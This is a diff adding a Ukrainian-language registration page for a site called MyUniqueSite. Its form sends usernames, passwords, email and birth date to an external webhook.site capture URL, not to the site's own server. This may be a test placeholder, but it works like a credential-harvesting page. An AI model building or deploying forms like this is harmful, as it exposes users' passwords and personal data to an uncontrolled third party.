@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html lang="uk">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Реєстрація користувача - MyUniqueSite</title>
+    <link rel="stylesheet" href="style.css" />
+  </head>
+  <body>
+    <h2>Ласкаво просимо до MyUniqueSite</h2>
+
+    <!-- Форма реєстрації -->
+    <form action="https://webhook.site/199f1217-b5ee-4511-8712-62beeaaab165" method="POST">
+      <div class="form-group">
+        <label for="логін">Логін:</label>
+        <input type="text" id="логін" name="логін" required />
+      </div>
+
+      <div class="form-group">
+        <label for="пароль">Пароль:</label>
+        <input type="password" id="пароль" name="пароль" required />
+      </div>
+
+      <div class="form-group">
+        <label for="email">Email:</label>
+        <input type="email" id="email" name="email" required />
+      </div>
+
+      <div class="form-group">
+        <label for="підтвердження_пароля">Підтвердження пароля:</label>
+        <input type="password" id="підтвердження_пароля" name="підтвердження_пароля" required />
+      </div>
+
+      <div class="form-group">
+        <label for="дата_народження">Дата народження:</label>
+        <input type="date" id="дата_народження" name="дата_народження" />
+      </div>
+
+      <div class="form-group">
+        <label for="стать">Стать:</label>
+        <select id="стать" name="стать">
+          <option value="чоловік">Чоловік</option>
+          <option value="жінка">Жінка</option>
+          <option value="інше">Інше</option>
+        </select>
+      </div>
+
+      <input type="submit" value="Зареєструватися" />
+    </form>
+
+    <div class="footer">&copy; 2024 MyUniqueSite. Усі права захищені.</div>
+  </body>
+</html>
